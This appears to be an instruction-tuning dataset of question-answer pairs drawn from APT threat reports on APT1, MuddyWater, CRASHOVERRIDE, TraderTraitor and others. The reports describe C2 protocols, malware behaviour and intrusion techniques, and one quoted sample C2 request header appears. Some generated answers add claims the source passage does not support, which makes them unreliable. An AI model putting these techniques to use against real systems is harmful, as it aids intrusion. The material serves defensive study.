    "output": "Estimating the amount of data stolen by APT1 is challenging due to several factors. Firstly, APT1 deletes the compressed archives after stealing them, leaving only trace evidence that is often overwritten during normal business activities. Secondly, pre-existing network security monitoring rarely records or identifies the data theft. Thirdly, the duration of time between the data theft and Mandiant's investigation is often too great, leading to the trace evidence being overwritten. Lastly, some victims prioritize restoring network security over investigating the impact of the security breach, making it difficult to assess the full extent of the data theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key differences between the data exfiltrated by Dark Caracal's Android and Windows malware? Provide examples of the types of data collected by each.",
    "output": "The Android malware used by Dark Caracal collects a broad range of sensitive user information, including SMS messages, contact lists, call logs, installed applications, bookmarks and browsing history, connected Wi-Fi details, authentication accounts, file and directory listings, audio recordings and messages, and photos. In contrast, the Windows malware focuses on desktop screenshots, Skype logs databases, photos, iPhone backups, file listings, and corporate and legal documentation. Both types of malware aim to provide a comprehensive view of the victim's activities and personal information, but they are tailored to the specific capabilities and data available on their respective platforms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ByeBye Shell and the targeting of Pakistan\nPosted by Claudio Guarnieri in Information Security on Aug 19, 2013 2:10:45 PM\nAsia and South Asia are a theater for daily attacks and numerous ongoing espionage campaigns between neighboring countries, so many campaigns that it's hard to keep count. Recently I stumbled on yet another one, which appears to have been active since at least the beginning of the year, and seems mostly directed at Pakistani targets.\nIn this article we're going to analyze the nature of the attacks, the functionality of the backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the operators behind this campaign.\nRead the text above and answer this question: Why was the ByeBye Shell campaign particularly challenging to track and analyze, and how did its focus on Pakistani targets influence its operational strategy?",
    "output": "The ByeBye Shell campaign was particularly challenging to track and analyze due to the high volume of ongoing espionage activities in Asia and South Asia. The region is a theater for daily attacks and numerous campaigns, making it difficult to distinguish individual operations. The campaign's focus on Pakistani targets influenced its operational strategy by tailoring the attacks to exploit vulnerabilities specific to Pakistan's digital infrastructure and political climate. This targeted approach allowed the campaign to remain under the radar while effectively gathering intelligence on Pakistani entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThis short report details the techniques being used in a series of attacks mostly against Israel\u00adbased organisations. The decoy documents and filenames used in the attacks suggest the intended targets include organisations with political interests or influence in Israel and Palestine. Although we are unable to link this campai(<http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html#_ftn3>)gn to any already documented in open source, it bears similarities to some described by others previously[1],[2].\nThe earliest samples in the campaign we have identified date back to the summer of 2014. The number of samples discovered and relatively small scale of infrastructure suggest the attackers have limited resources with which to conduct attacks.\nBig Headline: Delivery\nThe most common way this malware packaged is via a self\u00adextracting RAR file; however the attackers also appear to have used a number of other solutions to drop their malware, including a Visual Basic based wrapper and an Auto\u00adIT based wrapper.\nIn terms of how the malware is delivered, it's most likely that it's done via spearphishing. For example, there are also several occasions where the VirusTotal 'ITW' tab suggests that the original dropper was available to download on a 3rd party website. In the case of the sample discussed in the introduction we can see:\nPomf.se is a relatively low\u00adprofile file sharing/hosting website currently based in Sweden. The use of low\u00adkey file\u00adsharing sites appears to be a feature of the campaign as far as we can tell, with a few other similar sites being used in the same way.\nWe've chosen to refer to the malware as 'DownExecute' due to the .pdb string left in the malware (leaving debug paths in malware seems to be very fashionable at the moment\u2026):\nAll variants of the Do(<http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html#_ftn4>)wnExecute' malware we've identified come packaged in the following fashion:\nSo what can this malware do? Not all that much \u2013 it's just a downloader.\nBefore execution, the malware makes a couple of checks to avoid analysis, including checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox by looking for the device name \\\\.\\VBoxMiniRdrDN:\nThe malware also checks for the presence of several anti\u00advirus solutions, as well for any processes including the word 'security':\nMeanwhile, the malware begins calling home, whilst also keeping a log of its actions in a plaintext file that is created in the same folder as where the binary was executed from.\nBig Headline: After successful compromise\u2026\nIt appears as though the clue for the main functionality of this malware is in its name (it downloads, and then executes) files, as it offers little else for the attacker. The DownExecute malware is used as a way for the attackers to gain an initial foothold on the victim machine. The basic information reported back by the malware would also certainly allow the attacker a way to triage infections to ensure they had reached their intended victim rather than a researcher.\nWe don't have great visibility into post\u00adcompromise activity at this stage; however there are a number of other malware samples which communicate with the same infrastructure as the DownExecute samples. It's not unreasonable to infer that if these are more fully featured backdoors, that they are likely the 2nd stage malware families used in conjunction with DownExecute. Specifically, we've observed the well\u00addocumented Xtreme RAT and Poison Ivy malware families in use with the same domain names as DownExecute. The Poison Ivy passwords observed for the group were 'admin2014' and 'admin!@#$%\".\nBig Headline: Command & Control Infrastructure\nThe vast majority of infrastructure in terms of hostnames observed associated with these attacks have been dynamic DNS domains, primarily associated with no\u00adip.com. This provider is popular with several Middle Eastern threat actors tracked by PwC's intelligence team. In terms of the size of the infrastructure used in the campaign using the tools described, it(<http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html#_ftn5>)'s also fairly small, as shown on our Maltego graph.\nThe attackers have made an unusual choice with respect to the hosting providers used for the malicious infrastructure. Most of the domains at the time of writing, and indeed historically, have pointed to IP address space owned by Host Sailor, geo\u00adlocated in Belize. Many of the threat actors in the Middle East that we're familiar with have extremely volatile IP hosting, owing to the fact that the infrastructure is likely to be hosted on their own networks. This remote hosting therefore somewhat bucks the trend of some of\nto be hosted on their own networks. This remote hosting therefo the other actors we see from the region.\nBig Headline: Inferred Targeting\nAs we have mentioned in a number of our other reports[5], attackers often use C&C domains which contain phrases relevant to their targets so as to make them appear legitimate. With this in mind we performed some simple analysis on the domain names used in this campaign to identify legitimate organisations being impersonated. For a full list of C&Cs used, please see Appendix B.\nAs shown, there appears to be a theme here, with a number of Israeli news organisations being used as C&C themes and hence probably being targeted. So do we believe this campaign is focused only at Israeli companies? Perhaps not entirely.\nBig Headline: Targeting\nWhilst there are a number of documents clearly aimed at Israeli nationals , using political and military themes, one of the lures[6] included an Arabic language decoy document pictured below:\nThe document in question discusses an alleged leak of information relating to Abbas, leader of the Palestine Liberation Organization. Whilst this is a subject which is clearly of key interest to all parties in the region, the fact the attackers sent an Arabic language version of the story may indicate that the recipient was expected to be fluent in Arabic, and possibly therefore less likely to be Israeli, but rather\nsomeone from another adjacent region.\nBig Headline: Conclusion\nWhilst, in this case, we're unable to attribute this set of activity to a specific group or entity in the Middle East, it does bear a significant resemblance to many attacks seen from the Middle East that have been previously documented. Specifically, the following aspects of this campaign remind us of existing write\u00adups on Middle Eastern campaigns:\nConsistent use of  the dynamic DNS provider no\u00adip.com and associated domains:  it's unclear why there is a preference for this, howev(<http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html#_ftn7>)er in several 'how\u00adto' videos on Arabic language underground forums the video creators recommend using no\u00adip.com as opposed to other dynamic DNS providers;\nUse of publically available  malware: many groups operating in the Middle East use malware families (such as Poison Ivy/Xtreme RAT) which are publically available rather than developing their own binaries;\nVariety of targeting: the targeting seems entirely restricted to Middle Eastern issues and, whilst there appears to be a heavy focus on Israel in the decoy documents we've observed, there is the possibility that Palestinians have been targeted as well. This is consistent with the complex relationships between the different nations and political groups in the region;\nPassword schema: In their August 2013 blog[7], FireEye noted that a group they refer to as MoleRats used Poison Ivy and Xtreme RAT, in conjunction with a password of \"!@#GooD#@!\" The keyboard walk used for the symbols \"!@#\" across the top of a keyboard is similar to the password observed in some of our Poison Ivy samples.\nThe fact that the attackers chose to develop their own dropper may be indicative that their biggest problem when conducting network intrusions is getting their foot in the door \u2013 particularly as it seems as though they still prefer the more fully featured Poison Ivy and Xtreme RAT backdoors as 2nd stage malware families.\nWhen we pivoted and looked for the earliest examples of the DownExecute malware, the first samples we could find were compiled in June 2014. We have no reason to believe in this case that the threat actor has tampered with the compile time on any samples, as all other samples discovered were identified shortly after they were compiled. As such we believe the campaign using this downloader malware has been on\u00adgoing for approximately 12 months.\n\nWhat is the significance of the attackers' choice to use dynamic DNS domains, primarily associated with no-ip.com, for their command and control infrastructure, and how can organizations defend against this tactic?",
    "output": "The attackers' choice to use dynamic DNS domains, primarily associated with no-ip.com, allows them to frequently change the IP addresses associated with their command and control servers, making it harder for defenders to block or take down their infrastructure. This tactic is common among Middle Eastern threat actors. To defend against this, organizations can implement domain reputation systems that monitor and block suspicious dynamic DNS domains, use threat intelligence feeds to stay informed about known malicious domains, and employ network traffic analysis to detect anomalous communication patterns indicative of C&C activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nIn November 2017, the NCSC released an advisory highlighting the Turla Group's use of the tools Neuron and Nautilus.1\nSince then, the NCSC has identified a new version of the Neuron malware. The new version has been modified to evade previous detection methods.\nNeuron operates on Microsoft Windows platforms, primarily targeting mail servers and web servers. The NCSC has observed this tool being used by the Turla group to maintain persistent network access and to conduct network operations.\nThe compile times contained within these new binaries show that the actor implemented the required modifications to Neuron approximately five days after public releases by the NCSC and other vendors.\nThis NCSC report provides new intelligence on the Neuron malware, a tool used by the Turla group to target the UK. It contains IOCs and signatures for to be used for network monitoring and detection.\nThe files analysed in this report are available on VirusTotal.\nQ: How did the Turla Group modify the Neuron malware to evade detection, and what does this reveal about their operational capabilities?",
    "output": "The Turla Group modified the Neuron malware to evade previous detection methods. This was evident from the compile times within the new binaries, which showed that the necessary modifications were made approximately five days after public releases by the NCSC and other vendors. This rapid response indicates that the Turla Group possesses advanced operational capabilities, allowing them to quickly adapt their tools to counteract newly published defenses. This agility highlights the importance of continuous monitoring and updating of detection mechanisms to stay ahead of sophisticated threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nWith access to business critical information, senior executives and consultants are often said to be valuable targets for threat actors tasked with obtaining sensitive business secrets. FIN4 is a financially motivated threat actor which has consistently targeted this population.\nOn 23 June 2015, the press reported that the Securities and Exchange Commission are investigating FIN4's activities[1].\nSince mid-2013, this group is reported[2] to have targeted more than 100 organisations which are primarily NASDAQ and NYSE listed companies or firms working with those listed clients to provide advisory or financial services, such as investment banking. In particular, the FIN4 group has shown a particular interest in the healthcare and pharmaceutical industry and appears to have team members who are intimately familiar with that industry.\nThe group is not a new threat and has been previously reported on by other security companies:\nTowards the end of 2013 security company Esentire released a brief alert (ESOC-2013-11-08[3]) regarding a \"targeted attack against hedge funds\";\nIn May 2014, Symantec released a brief alert (O97M.Ratil[4]) providing further details and mitigations for the threat; and,\nIn November 2014 FireEye released a detailed report on the threat actor, their tactics, techniques and their targets.\nThese reports document two methods of attack used by the FIN4 group: malicious Microsoft Office documents to obtain credentials, and phishing pages designed to mimic Outlook Web App authentication pages.\nOur research into FIN4 has uncovered evidence which indicates that FIN4 also used bespoke malware to harvest credentials and steal documents from compromised victims.\nQ: How does the FIN4 threat actor leverage its knowledge of specific industries to enhance the effectiveness of its attacks?",
    "output": "The FIN4 threat actor leverages its knowledge of specific industries, particularly the healthcare and pharmaceutical industry, to enhance the effectiveness of its attacks by targeting organizations and individuals who are intimately familiar with these sectors. This specialized knowledge allows FIN4 to craft highly tailored and convincing phishing campaigns, malicious documents, and other social engineering tactics that are more likely to deceive senior executives and consultants within these industries. By understanding the nuances and jargon of the healthcare and pharmaceutical sectors, FIN4 can create more credible lures, increasing the likelihood that their targets will fall victim to their schemes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Terracotta APT use Brute Force: Password Guessing to compromise Windows servers and enlist them into their VPN ecosystem?",
    "output": "Brute Force: Password Guessing is a technique used by adversaries to gain unauthorized access to accounts by systematically guessing passwords. In the case of the Terracotta APT, they use this technique to compromise Windows servers and enlist them into their VPN ecosystem. According to the analysis, the Terracotta APT uses a brute force password attack on the 'Administrator' user account via DCOM Windows Management Interface (WMI) through TCP port 135. They use a reconnaissance host to perform the brute force activity, which was also observed performing port 135 scanning on the Internet. Once they gain access to the server, they disable the Windows Firewall, install the Telnet Service, and create a new Windows account, which is then used to install additional malware and configure the server as a VPN node. The use of Brute Force: Password Guessing allows the Terracotta APT to compromise servers without prior knowledge of the passwords, and the fact that many of the compromised servers did not have hardware firewalls or had their software firewalls turned off made them vulnerable to this type of attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nHTran and the Advanced Persistent Threat\nURL: (<http://www.secureworks.com/research/threats/htran/>)http://www.secureworks.com/research/threats/htran/\nDate: August 3, 2011\nAuthor: Joe Stewart, Director of Malware Research, Dell SecureWorks Counter Threat Unit Research Team\nWhile researching one of the malware families involved in the RSA breach disclosed in March 2011, Dell SecureWorks CTU observed an interesting pattern in the network traffic of a related sample (MD5:53ba6845f57f8e9ef600ef166be3be14). When the sample under analysis attempted to connect to the C2 server at my.amazingrm.com (203.92.45.2), the server returned a succinct plain-text error message instead of the expected HTTP-formatted response:\n[SERVER]connection to funn\nAlthough the message was seemingly truncated, this pattern was enough to correlate the error string to a known (and fairly old) program called \"HUC Packet Transmit Tool\", or \"HTran\", for which source code can be readily found on the Internet: (<http://read.pudn.com/downloads199/sourcecode/windows/935255/htran.cpp__.htm>)http://read.pudn.com/downloads199/sourcecode/windows/935255/htran.cpp__.htm\nHTran is a rudimentary connection bouncer, designed to redirect TCP traffic destined for one host to an alternate host. The source code copyright notice indicates that HTran was authored by \"lion\", a well-known Chinese hacker and member of \"HUC\", the (<http://en.wikipedia.org/wiki/Honker_Union>)Honker Union of China. The purpose of this type of tool is to disguise either the true source or destination of Internet traffic in the course of hacking activity.\nHTran contains several debugging messages throughout the source code that are sent to the console or to the connecting client in order to diagnose connection issues. The part of the HTran source code that generated the error message seen in the trojan C2 response is shown below:\nif(client_connect(sockfd2,host,port2)==0)\n{ closesocket(sockfd2); sprintf(buffer,\"[SERVER]connection to %s:%d error\\r\\n\", host, port2); send(sockfd1,buffer,strlen(buffer),0);\nThe code is written so that if the connection bouncer is unable to connect to the hidden destination in order to relay the incoming traffic, the formatted error message containing the target host and port parameters will be sent to the connecting client. As long as there are no connection issues, HTran might be a useful tool to hide a trojan C2's true location - but, in the case of any connection downtime between the HTran host and the hidden C2, HTran will betray the location of the hidden C2 host.\nInstances of HTran on multiple hosts could theoretically be chained together in order to add extra layers of obfuscation. However, in case of the final endpoint C2 being unavailable for any reason, the last link in the HTran chain will still pass its connection failure message up the chain, rendering all of the other layers of obfuscation useless. This tiny bit of error debugging code left in by the author can be quite useful if one wants to track HTran-bounced hacking activity to its source.\n\nHow does the HTran tool function to disguise the true source or destination of Internet traffic, and what specific mechanism within its source code can potentially reveal the hidden Command and Control (C2) server's location?",
    "output": "HTran is a rudimentary connection bouncer designed to redirect TCP traffic destined for one host to an alternate host, thereby disguising the true source or destination of Internet traffic. The tool contains debugging messages throughout the source code that are sent to the console or to the connecting client to diagnose connection issues. Specifically, if HTran is unable to connect to the hidden destination to relay the incoming traffic, it sends a formatted error message containing the target host and port parameters to the connecting client. This error message can reveal the location of the hidden C2 server if there are any connection issues between the HTran host and the hidden C2.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Targeting\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we've collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include:\nAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online.\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover.\nCopy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.\nCopy of the official Taiwan holiday schedule for 2016, which is the 105th anniversary of the current\nTaiwanese government.\nBig Headline: Evolve to Survive: TTP Shifts and Infrastructure\nWe've expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we've found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor\u00adregistered and DDNS, with the actor\u00adregistered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report.\nAlso new is the actors' use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing\u00adwen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power. In line with her party's stance, she is widely seen as a proponent of an independent Taiwan and not in favor of reunification with the People's Republic of China.\nBig Headline: Malware Updates\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have relied on this tool as a payload in cyber\u00adespionage attacks for many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions of Emissary to remain undetected and fresh over time.\nWe analyzed all of the known Emissary samples to determine what changes the malware author made between the different versions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should be noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline only shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used in attacks.\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009 and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September 2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author released version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which was out\u00adof\u00adsequence from the incrementing versioning. Between August and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process in earlier versions.\nBig Headline: !Emissary D,evelopment: Com1pilation 'Times per Ver,sion\nThe out\u00adof\u00adsequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in the changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign code associated with of the out\u00adof\u00adsequence version 3.0 sample was \"3test\", suggesting the malware author created it for testing purposes. The other campaign code associated with the out\u00adof\u00adsequence sample was \"IC00001\", which could denote an attack payload as it appears to be a plausible code to describe a campaign.\nWhile this may be coincidental, the out\u00adof\u00adsequence version 3.0 sample was created ten days after we published the paper that exposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make malware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary suggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in attacks.\n\nAnswer this question based on the above context: What key updates and developments were made to the Emissary Trojan over its lifespan, and how did the malware authors respond to external factors such as research publications?",
    "output": "The Emissary Trojan underwent several updates and developments over its lifespan, with the earliest version created in May 2009. Notable updates included version 2.0 in September 2011, version 3.0 in December 2014, and version 4.0 in March 2015. After the publication of a paper exposing the Elise Trojan in June 2015, the malware authors created an out-of-sequence version 3.0 sample, which appeared to be an early variant of version 5.0. This rapid development suggested that the authors were making frequent modifications to evade detection and actively using the Emissary Trojan as a payload in attacks. The timeline of updates indicated a significant increase in development efforts post-publication, with versions 5.0, 5.1, 5.3, and 5.4 created in quick succession between August and November 2015.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "MuddyWater eN-Able spear-phishing with new TTPs\nNovember 1, 2023\nExecutive summary:\nDeep Instinct's Threat Research team has identified a new campaign from the \"MuddyWater\" group\nThe campaign has been observed attacking two Israeli targets\nThe campaign exhibits updated TTPs to previously reported MuddyWater activity\nIntroduction\nresearch showed that MuddyWater has sent spear-phishing emails, starting back in 2020, with direct links, as well as PDF, RTF, and HTML attachments containing links to archives hosted on various file-sharing platforms.\nThose archives contained installers for various legitimate remote administration tools.\nBefore launching the new campaign during the Israel-Hamas war, MuddyWater previously known remote administration tools, utilizing a new file-sharing service called \"(<https://www.storyblok.com/>)Storyblok.\"\nOn October 30th Deep Instinct identified two archives hosted on \"Storyblok\" containing a new multi-stage infection vector. It contains hidden files, an LNK file that initiates the infection, and an executable file designed to unhide a decoy document while executing (<https://www.n-able.com/features/advanced-monitoring-agent>)Advanced Monitoring Agent, a remote administration tool.\nThis is the first public report about MuddyWater utilizing this remote administration tool.\nThe Multi-stage Social Engineering Campaign\nWhile Deep Instinct could not verify the spreading mechanism of the new campaign, it most likely starts with a spear-phishing email, similar to previous campaigns.\nThe content of the email lures the victim into downloading an archive hosted at \"a.storyblok[.]com\"\nIn this analysis, we examine the \"defense-video.zip\" file.\nWhen the archive is extracted, several folders must be navigated until a LNK shortcut, which looks like another folder named \"Attachments,\" is found:\nHowever, there are additional hidden folders and files extracted from the archive:\nWhen the victim opens the LNK file, the infection chain starts.\nBy examining the LNK file, we can see that it executes an executable from one of the hidden directories:\nThe file \"Diagnostic.exe\" has been used in both archives Deep Instinct observed. The purpose of this file is to execute another executable called \"Windows.Diagnostic.Document.EXE,\" which is located in the hidden directory named \".end\" under a \"Windows.Diagnostic.Document\" hidden directory.\nThe file named \"Windows.Diagnostic.Document.EXE\" is a signed, legitimate installer for \"Advanced Monitoring Agent.\"\nIn addition to executing the remote administration tool, \"Diagnostic.exe\" also opens a new Windows Explorer window of the hidden \"Document\" folder. This is done to fool the victim that opened the LNK file into thinking that it was indeed a folder.\nThe decoy document is an official memo from the Israeli Civil Service Commission, which can be publicly downloaded from their .\nThe memo describes what to do in case a government worker expresses opinions against the Israeli state on social networks:\nConclusion\nMuddyWater continues to attack Israeli targets in various ongoing campaigns.\nIn this campaign, MuddyWater employs updated TTPs. These include a new public hosting service, employing a LNK file to initiate the infection, and utilizing intermediate malware that mimics the opening of a directory while executing a new remote administration tool.\nAfter the victim has been infected, the MuddyWater operator will connect to the infected host using the legitimate remote administration tool and will start doing reconnaissance on the target.\nAfter the reconnaissance phase, the operator will likely execute PowerShell code which will cause the infected host to beacon to a custom C2 server.\nMuddyWater has used (<https://www.deepinstinct.com/blog/phonyc2-revealing-a-new-malicious-command-control-framework-by-muddywater>)PhonyC2 in the past. However, Deep Instinct recently observed MuddyWater using a new C2 framework named MuddyC2Go \u2013 a detailed blog will be published soon, stay tuned.\nIOCs:\nFile\nMD5 Description\nNetwork\nAdditional IOCs regarding MuddyWater can be found in our GitHub page: (<https://github.com/deepinstinct/Israel-Cyber-Warfare-Threat-Actors>)https://github.com/deepinstinct/Israel-Cyber-Warfare-Threat-Actors\n\nWhat new tactics, techniques, and procedures (TTPs) did MuddyWater employ in their recent campaign targeting Israeli entities? How do these TTPs differ from their previous activities?",
    "output": "In their recent campaign targeting Israeli entities, MuddyWater employed several new TTPs. These include using a new public hosting service called 'Storyblok' to host malicious archives, utilizing an LNK file to initiate the infection process, and deploying intermediate malware that mimics the opening of a directory while executing a new remote administration tool called 'Advanced Monitoring Agent'. These TTPs differ from their previous activities by incorporating a multi-stage infection vector that involves hidden files and directories, as well as a decoy document to mislead the victim. Additionally, MuddyWater has started using a new C2 framework named 'MuddyC2Go', which is a departure from their previous use of the PhonyC2 framework.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background\nIn February 2013, Bit9 released a statement revealing that in July 2012, their network had been compromised by a malicious third-party. A well-known group named Hidden Lynx with affiliations to \"Operation Aurora\" managed to break into Bit9's network using an SQL injection attack. These Trojans made their way into the defense industrial sector.\nHowever, the Bit9 compromise was only a small piece of a much larger watering-hole operation known as the VOHO campaign, which impacted hundreds of organizations in the United States. Further, the VOHO campaign itself was just one campaign of many that is attributable to this incredibly prolific group. Each campaign is designed to access information in governmental and commercial organizations that tend to operate in the wealthiest and most technologically advanced countries in the world.\nAnswer this question: How did the Hidden Lynx group manage to compromise Bit9's network in 2012, and what broader implications did this incident have on the cybersecurity landscape?",
    "output": "The Hidden Lynx group compromised Bit9's network in July 2012 through an SQL injection attack. This attack allowed them to insert malicious Trojans into the network, which subsequently spread to the defense industrial sector. The Bit9 compromise was part of a larger watering-hole operation known as the VOHO campaign, which affected hundreds of organizations in the United States. This campaign was one of many conducted by the Hidden Lynx group, targeting governmental and commercial organizations in wealthy and technologically advanced countries. The broader implications of this incident highlight the sophistication and reach of advanced persistent threat (APT) groups like Hidden Lynx, demonstrating their ability to infiltrate high-value targets and underscoring the need for robust cybersecurity measures to protect against such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the 'sequence' attack option in CRASHOVERRIDE, and how does it affect substation operations and recovery efforts?",
    "output": "The 'sequence' attack option in CRASHOVERRIDE involves polling the target device for appropriate addresses and then toggling the value to open closed breakers. This creates an infinite loop that continues to set addresses to this value, effectively de-energizing the substation line(s) and preventing system operators from managing the breakers and re-energizing the line(s). Remote staff will lose control of the breakers and will need to send crews to the substation, potentially resulting in a few hours of outages if the CRASHOVERRIDE loop continues unabated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C2 COMMUNICATION\nIEXPL0RE has two different methods of communication: HTTP POST and GET. It also has the ability to use a HTTP CONNECT proxy. POST is the preferred method of communication; if it does not work, it will also attempt a GET connection.\nAll communication from the client to the server is encrypted with a one-byte XOR key 0xCD. (Information in this report shows the data after decryption.) POST commands put the data in the request body, while GET commands put the data in URL parameters. Server responses are all 200 OK messages with data in the body.\nThe system keeps track of the communication using a sequence number, which is part of the requested URL. The sequence number is nine digits long, starts at 000000001, and generally increments by one for each packet sent. When authenticated, the sequence number jumps to 000001000; if disconnected, the sequence number returns to the next sub-1000 number expected.\nMedium Headline: THE HEADERS OF THE REQUEST LOOK LIKE THIS:\nPOST /index000000001.asp HTTP/1.1\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)\nHost: update.microsoft.com\nConnection: Keep-Alive\nContent-Type: text/html\nContent-Length: 000041\nThe Accept-Language, User-Agent, Connection, and Content-Type headers are always fixed. The Host header is also always fixed as update.microsoft.com; any requests to the C2 server made without this header in place will be rejected, often with a redirect to Microsoft's website.\nWhen run, ContainerV2 communicates with the C2 server, first establishing a socket by a three-way handshake. Below, the text at the start of the arrow indicates the packet type, sequence number, and connection socket. For example, \"POST 2 (1)\" means that it is using an HTTP POST request, sequence number 2, on the first established connection (figure. 6). The text on the line is the data in the packet after decryption.\n\nQ: How does the IEXPL0RE RAT establish and maintain communication with its command and control (C2) server, and what encryption method is used for the communication?",
    "output": "A: The IEXPL0RE RAT uses two different methods of communication: HTTP POST and GET, with the ability to use an HTTP CONNECT proxy. POST is the preferred method, and if it fails, the RAT attempts a GET connection. All communication from the client to the server is encrypted using a one-byte XOR key 0xCD. POST commands include the data in the request body, while GET commands include the data in URL parameters. Server responses are all 200 OK messages with data in the body. The system tracks communication using a sequence number, which is part of the requested URL. This sequence number is nine digits long, starts at 000000001, and generally increments by one for each packet sent. Upon authentication, the sequence number jumps to 000001000; if disconnected, it returns to the next sub-1000 number expected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Threat Update\nThe U.S. government has identified a group of North Korean state-sponsored malicious cyber actors using tactics similar to the previously identified Lazarus Group (see AppleJeus: Analysis of North Korea's Cryptocurrency Malware). The Lazarus Group used AppleJeus trojanized cryptocurrency applications targeting individuals and companies\u2014including cryptocurrency exchanges and financial services companies\u2014through the dissemination of cryptocurrency trading applications that were modified to include malware that facilitates theft of cryptocurrency. As of April 2022, North Korea's Lazarus Group actors have targeted various firms, entities, and exchanges in the blockchain and cryptocurrency industry using spearphishing campaigns and malware to steal cryptocurrency. These actors will likely continue exploiting vulnerabilities of cryptocurrency technology firms, gaming companies, and exchanges to generate and launder funds to support the North Korean regime.\nMedium Headline: Tactics, Techniques and Procedures\nIntrusions begin with a large number of spearphishing messages sent to employees of cryptocurrency companies\u2014often working in system administration or software development/IT operations (DevOps)\u2014on a variety of communication platforms. The messages often mimic a recruitment effort and offer high-paying jobs to entice the recipients to download malware-laced cryptocurrency applications, which the U.S. government refers to as \"TraderTraitor.\"\nThe term TraderTraitor describes a series of malicious applications written using cross-platform JavaScript code with the Node.js runtime environment using the Electron framework. The malicious applications are derived from a variety of open-source projects and purport to be cryptocurrency trading or price prediction tools. TraderTraitor campaigns feature websites with modern design advertising the alleged features of the applications (see figure 1).\nThe JavaScript code providing the core functions of the software is bundled with Webpack. Within the code is a function that purports to be an \"update,\" with a name such as UpdateCheckSync(), that downloads and executes a malicious payload (see figure 2).\nThe update function makes an HTTP POST request to a PHP script hosted on the TraderTraitor project's domain at either the endpoint /update/ or /oath/checkupdate.php. In recent variants, the server's response is parsed as a JSON document with a key-value pair, where the key is used as an AES 256 encryption key in Cipher Block Chaining (CBC) or Counter (CTR) mode to decrypt the value. The decrypted data is written as a file to the system's temporary directory, as provided by the os.tmpdir() method of Node.js, and executed using the child_process.exec() method of Node.js, which spawns a shell as a child process of the current Electron application. The text \"Update Finished\" is then logged to the shell for the user to see.\nObserved 